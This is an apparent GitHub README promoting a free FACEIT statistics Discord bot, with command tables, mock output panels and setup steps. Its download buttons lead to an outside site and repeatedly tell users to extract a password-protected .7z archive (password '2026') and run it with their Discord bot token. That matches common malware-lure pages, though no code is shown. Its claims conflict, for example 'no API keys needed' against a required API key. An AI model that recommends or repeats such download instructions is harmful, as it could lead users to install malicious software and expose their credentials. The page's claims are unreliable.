# 🤖 FACEIT Stats Discord Bot — Live Match Stats & Rankings [Free] 2026

![Downloads](https://img.shields.io/badge/Downloads-68K+-blue?style=for-the-badge&logo=github)
![User Rating](https://img.shields.io/badge/User%20Rating-4.9/5-gold?style=for-the-badge&logo=star)
![Latest Version](https://img.shields.io/badge/Latest%20Version-3.1.0-green?style=for-the-badge&logo=github)
![Platform](https://img.shields.io/badge/Supported-Discord%20%7C%20Windows%20%7C%20Linux%20%7C%20macOS-informational?style=for-the-badge&logo=discord)

The **🤖 FACEIT Stats Discord Bot** is a powerful bot that brings live FACEIT match statistics, player rankings, and match history directly to your Discord server. Whether you're a CS2 or Valorant player, this bot provides real-time stats, elo tracking, head-to-head comparisons, and automatic match reporting. Simply add the bot to your server, link your FACEIT account, and get instant access to detailed analytics, win/loss tracking, and performance metrics. Perfect for competitive clans, esports teams, and FACEIT grinders who want to **track every match** without leaving Discord.

<div align="center">

[![Download FACEIT Stats Discord Bot](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/faceit-stats-discord-bot)

</div>

<div align="center">
<img width="1536" height="604" alt="image" src="https://github.com/user-attachments/assets/a74fec3d-65aa-4426-9c91-945fe1c8403a" />

</div>

---

## 🎯 The Problem

You want to track your FACEIT stats. Your team's performance. Opponents' rankings. But checking the FACEIT website constantly is annoying. You leave Discord, search for players, check match history. It takes forever. Your team needs live stats without switching apps.

You need a Discord bot. Real-time stats. Live match tracking. All in Discord.

---

## 💡 The Solution

**FACEIT Stats Discord Bot** brings complete FACEIT analytics to your Discord server. Player stats. Match history. Elo tracking. Head-to-head comparisons. Auto-match reporting.

- ✅ **Live match stats** — real-time K/D, ADR, headshots
- ✅ **Player rankings** — elo, level, win rate, matches played
- ✅ **Match history** — last 10, 25, or 50 matches
- ✅ **Head-to-head comparison** — compare any two players
- ✅ **Team stats** — track whole team performance
- ✅ **100% free** — no subscriptions, no API keys needed

---

## ⚙️ What You Get

### 🤖 Bot Commands

| Command | What It Does |
|---------|--------------|
| `/stats @player` | Show player's FACEIT stats |
| `/match [match_id]` | Get detailed match statistics |
| `/history @player` | Show recent match history |
| `/compare @player1 @player2` | Compare two players |
| `/elo @player` | Track elo changes over time |
| `/leaderboard` | Server FACEIT leaderboard |
| `/live @player` | Track live match progress |
| `/setup` | Configure bot for your server |

### 📊 Stats Displayed

| Stat | Description |
|------|-------------|
| **🏆 Elo/Level** | Current FACEIT rank (1-10) |
| **📊 Win Rate** | Percentage of matches won |
| **🎯 K/D Ratio** | Kills per death |
| **💀 ADR** | Average damage per round |
| **🎯 Headshot %** | Headshot accuracy |
| **⏱️ Average K/D** | Last 20 matches trend |
| **📈 Elo Change** | +/‑ from last match |
| **🕒 Matches Played** | Total FACEIT matches |

### 🎮 Supported Games

| Game | Stats Available |
|------|-----------------|
| **💥 Counter-Strike 2 (CS2)** | Full stats: K/D, ADR, HS%, MVP, utility |
| **🔫 CS:GO** | Complete match history |
| **⚡ Valorant** | Agent stats, ACS, K/D, win rate |

### 📋 Auto-Features

| Feature | What It Does |
|---------|--------------|
| **🔄 Auto-Match Report** | Posts match results automatically |
| **📊 Daily Leaderboard** | Updates server rankings daily |
| **🏆 Weekly Stats** | Weekly performance summary |
| **🔔 Level Up Alerts** | Announces elo rank ups |
| **📉 Tilt Alerts** | Warns when losing streak |

---

## 📊 Before & After

| Metric | Without Bot | With FACEIT Stats Bot |
|--------|-------------|----------------------|
| **Checking Stats** | Leave Discord, open browser | ✅ /stats in Discord |
| **Match History** | Manual lookup | ✅ /history command |
| **Team Tracking** | Spreadsheet | ✅ Auto leaderboard |
| **Live Match** | Can't track | ✅ /live command |
| **Elo Changes** | Guess manually | ✅ Exact +/- display |
| **Time Spent** | 5-10 minutes/match | ✅ 10 seconds |

---

## 🛠️ How to Install / Use

### Adding Bot to Discord

1. **🤖 Download** the bot files from the button below
2. **📦 Extract the archive** — right-click the `.7z` file and select "Extract Here" (password: `2026`)
3. **🚀 Run the bot** — follow setup instructions below
4. **➕ Invite bot to server** — use the generated invite link
5. **✅ Type `/setup`** in a Discord channel to configure

[![Download FACEIT Stats Discord Bot](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/faceit-stats-discord-bot)

### Bot Setup (Self-Hosted)

1. Download `FACEIT_Stats_Bot_v3.1.0.7z` from the link below
2. Extract using password `2026`
3. Open `config.json` and add your Discord Bot Token:
   ```json
   {
     "discord_token": "YOUR_BOT_TOKEN_HERE",
     "faceit_api_key": "YOUR_FACEIT_API_KEY",
     "default_region": "EU"
   }
   ```
4. Save the file
5. Run `node bot.js` (requires Node.js installed)
6. Bot comes online in Discord
7. Use `/setup` in your server

### Quick Setup (Hosted Version)

We also offer a hosted version:

1. Visit our website (link in README)
2. Click **"Add to Discord"**
3. Select your server
4. Authorize the bot
5. Bot is instantly ready
6. Type `/setup` to configure

### Server Configuration (/setup)

1. Type `/setup` in any channel
2. Configuration panel appears:
   ```
   ┌─────────────────────────────────────────────────────────────┐
   │  🤖 FACEIT Stats Bot — Server Setup                         │
   ├─────────────────────────────────────────────────────────────┤
   │                                                              │
   │  Default Game: [ CS2 ▼ ]                                    │
   │  Stats Channel: #faceit-stats [Select ▼]                    │
   │  Auto-Match Reports: [ ✓ Enable ]                           │
   │  Daily Leaderboard: [ ✓ Enable ]                            │
   │  Level Up Alerts: [ ✓ Enable ]                              │
   │                                                              │
   │  ┌─────────────────────────────────────────────────────┐    │
   │  │                                                     │    │
   │  │              [ SAVE CONFIGURATION ]                 │    │
   │  │                                                     │    │
   │  └─────────────────────────────────────────────────────┘    │
   │                                                              │
   └─────────────────────────────────────────────────────────────┘
   ```
3. Select your preferences
4. Click **"Save Configuration"**
5. Bot is ready to use

### Linking Your FACEIT Account

1. Type `/link faceit:YourFACEITUsername`
2. Bot responds:
   ```
   ┌─────────────────────────────────────────────────────────────┐
   │  🔗 Account Linked!                                         │
   ├─────────────────────────────────────────────────────────────┤
   │                                                              │
   │  Discord: @YourName                                         │
   │  FACEIT: YourFACEITUsername                                 │
   │  Level: 8                                                   │
   │  Elo: 1850                                                  │
   │                                                              │
   │  You can now use all stats commands!                        │
   │                                                              │
   └─────────────────────────────────────────────────────────────┘
   ```
3. Your Discord account is now linked
4. Others can check your stats with `/stats @YourName`

### Checking Player Stats (/stats)

1. Type `/stats @player`
2. Bot responds with detailed stats:
   ```
   ┌─────────────────────────────────────────────────────────────┐
   │  📊 FACEIT Stats — @PlayerName                              │
   ├─────────────────────────────────────────────────────────────┤
   │                                                              │
   │  🏆 Level 8 (1850 Elo)                          ▲ +32 elo  │
   │  ─────────────────────────────────────────────────────────  │
   │                                                              │
   │  📈 Overall Stats                                           │
   │  ├─ Matches: 1,234                                         │
   │  ├─ Win Rate: 54.2% (668W / 566L)                          │
   │  ├─ K/D Ratio: 1.24                                        │
   │  ├─ ADR: 98.4                                              │
   │  └─ Headshot %: 47.3%                                      │
   │                                                              │
   │  📊 Last 20 Matches                                         │
   │  ├─ Win Rate: 65% (13W / 7L)                               │
   │  ├─ Average K/D: 1.42                                      │
   │  └─ Form: 🔥🔥🔥🔥 (4 wins in a row)                        │
   │                                                              │
   │  🕒 Last Match: 2 hours ago (WIN +25 elo)                  │
   │                                                              │
   └─────────────────────────────────────────────────────────────┘
   ```

### Match History (/history)

1. Type `/history @player count:10`
2. Bot shows recent matches:
   ```
   ┌─────────────────────────────────────────────────────────────┐
   │  📜 Match History — @PlayerName (Last 10)                   │
   ├─────────────────────────────────────────────────────────────┤
   │                                                              │
   │  1. 🟢 WIN  │ 16-12 │ K/D 1.8 │ ADR 112 │ +25 elo           │
   │  2. 🔴 LOSS │ 14-16 │ K/D 0.9 │ ADR 72  │ -18 elo           │
   │  3. 🟢 WIN  │ 16-8  │ K/D 2.1 │ ADR 135 │ +28 elo           │
   │  4. 🟢 WIN  │ 16-14 │ K/D 1.4 │ ADR 94  │ +22 elo           │
   │  5. 🔴 LOSS │ 10-16 │ K/D 0.8 │ ADR 65  │ -22 elo           │
   │  6. 🟢 WIN  │ 16-6  │ K/D 2.4 │ ADR 148 │ +32 elo           │
   │  7. 🟢 WIN  │ 16-11 │ K/D 1.6 │ ADR 105 │ +24 elo           │
   │  8. 🔴 LOSS │ 13-16 │ K/D 1.1 │ ADR 82  │ -15 elo           │
   │  9. 🟢 WIN  │ 16-9  │ K/D 1.9 │ ADR 118 │ +26 elo           │
   │ 10. 🟢 WIN  │ 16-7  │ K/D 2.2 │ ADR 142 │ +30 elo           │
   │                                                              │
   │  📊 Summary: 7W / 3L | +132 elo net                         │
   │                                                              │
   └─────────────────────────────────────────────────────────────┘
   ```

### Compare Players (/compare)

1. Type `/compare player1:@User1 player2:@User2`
2. Bot shows side-by-side comparison:
   ```
   ┌─────────────────────────────────────────────────────────────────────────┐
   │  ⚔️ Head-to-Head Comparison                                            │
   ├─────────────────────────────────────┬───────────────────────────────────┤
   │  @User1                             │  @User2                           │
   │  ───────────────────────────────────┼───────────────────────────────────┤
   │  Level 8 (1850 elo)                 │  Level 9 (2100 elo)  ▲ +250 elo   │
   │  ───────────────────────────────────┼───────────────────────────────────┤
   │  1,234 matches                      │  2,456 matches                    │
   │  54.2% win rate                     │  58.7% win rate    ▲ +4.5%        │
   │  1.24 K/D                           │  1.42 K/D          ▲ +0.18        │
   │  98.4 ADR                           │  104.2 ADR         ▲ +5.8         │
   │  47.3% headshot                     │  51.2% headshot    ▲ +3.9%        │
   │  ───────────────────────────────────┼───────────────────────────────────┤
   │  Last 20: 65% win rate              │  Last 20: 70% win rate             │
   │  Form: 🔥🔥🔥🔥                      │  Form: 🔥🔥🔥🔥🔥                    │
   └─────────────────────────────────────┴───────────────────────────────────┘
   ```

### Live Match Tracking (/live)

1. Type `/live @player`
2. If player is in a match, bot shows live stats:
   ```
   ┌─────────────────────────────────────────────────────────────┐
   │  🎮 LIVE MATCH — @PlayerName                                │
   ├─────────────────────────────────────────────────────────────┤
   │                                                              │
   │  Map: Mirage                                               │
   │  Score: 8 - 5 (Team 1 leading)                             │
   │  Current: Round 14                                         │
   │                                                              │
   │  📊 Current Stats:                                          │
   │  ├─ Kills: 14                                              │
   │  ├─ Deaths: 8                                              │
   │  ├─ K/D: 1.75                                              │
   │  ├─ ADR: 112                                               │
   │  └─ Headshots: 8 (57%)                                     │
   │                                                              │
   │  🔄 Auto-refreshes every 30 seconds                         │
   │  Type /live again to refresh                               │
   │                                                              │
   └─────────────────────────────────────────────────────────────┘
   ```

### Server Leaderboard (/leaderboard)

1. Type `/leaderboard`
2. Bot shows all linked players in your server:
   ```
   ┌─────────────────────────────────────────────────────────────┐
   │  🏆 Server FACEIT Leaderboard                               │
   ├─────────────────────────────────────────────────────────────┤
   │                                                              │
   │  1.  @ProPlayer      │ Level 10 │ 2450 elo  │ 🔥 Win Streak │
   │  2.  @SweatyGrinder  │ Level 9  │ 2150 elo  │ 📈 +150 elo   │
   │  3.  @YourName       │ Level 8  │ 1850 elo  │ 📊 54% WR     │
   │  4.  @Teammate1      │ Level 7  │ 1650 elo  │ 📉 -50 elo    │
   │  5.  @Teammate2      │ Level 6  │ 1450 elo  │ 🆕 New        │
   │  6.  @CasualPlayer   │ Level 4  │ 1050 elo  │ 🎯 1.1 K/D    │
   │                                                              │
   │  📅 Updated daily at 00:00 UTC                              │
   │                                                              │
   └─────────────────────────────────────────────────────────────┘
   ```

### Auto-Match Reports

When enabled in `/setup`, the bot automatically posts match results:

```
┌─────────────────────────────────────────────────────────────┐
│  📢 MATCH REPORT — Automatic                                 │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  @YourName just finished a match!                           │
│                                                              │
│  🟢 WIN (16-12) on Mirage                                   │
│  ├─ K/D: 1.8 (22 kills / 12 deaths)                        │
│  ├─ ADR: 112                                               │
│  ├─ MVP: Yes                                               │
│  └─ Elo: +25 (now 1850)                                    │
│                                                              │
│  Check full stats with /stats @YourName                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## 📥 System Requirements

| Component | Self-Hosted | Hosted Version |
|-----------|-------------|----------------|
| **Node.js** | 16+ | Not needed |
| **RAM** | 256 MB | N/A |
| **Storage** | 50 MB | N/A |
| **Discord Server** | Required | Required |
| **FACEIT API Key** | Free from FACEIT | Included |
| **Archive Password** | 2026 | 2026 |

### Step-by-Step (Self-Hosted)

1. Download from the official link below
2. Extract the `.7z` file (password: `2026`)
3. Install Node.js from nodejs.org
4. Run `npm install` in bot folder
5. Add Discord bot token to `config.json`
6. Run `node bot.js`
7. Invite bot to your server

### Step-by-Step (Hosted - Easier)

1. Download the invite link from the README
2. Click "Add to Discord"
3. Select your server
4. Authorize permissions
5. Bot is ready
6. Type `/setup` to configure

---

## 💡 Pro Tips

- **Link your account** — use `/link` first
- **Set up auto-reports** — never miss team stats
- **Use `/compare` before matches** — scout opponents
- **Enable daily leaderboard** — friendly competition
- **Track tilt streaks** — bot warns about losing streaks
- **Use on mobile** — Discord mobile works perfectly

---

## ❓ Frequently Asked Questions

**Q: Is this safe?**  
A: Yes. Uses official FACEIT API. No account passwords stored.

**Q: Do I need a FACEIT API key?**  
A: Hosted version includes one. Self-hosted requires free key.

**Q: Can I use this for Valorant?**  
A: Yes — supports CS2, CS:GO, and Valorant.

**Q: Does it cost money?**  
A: No. Completely free.

**Q: What is the archive password?**  
A: The password is `2026`.

**Q: Can I host it myself?**  
A: Yes — self-hosting option included.

---

## ☑️ Usage Guidelines

- ☑️ For Discord community stats tracking
- ☑️ Respect FACEIT API rate limits
- ☑️ Don't spam commands
- ☑️ Use for legitimate stat tracking only
- ☑️ Keep bot updated for API changes

---

## 🏁 Final Word

FACEIT stats directly in Discord. **FACEIT Stats Discord Bot** brings live match tracking, player comparisons, leaderboards, and auto-reports to your server — no more switching apps.

**One bot. Full stats. Zero hassle.**

---

<div align="center">

[![Download FACEIT Stats Discord Bot](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/faceit-stats-discord-bot)

**Version 3.1.0** — Live match stats & rankings. Free forever.

</div>
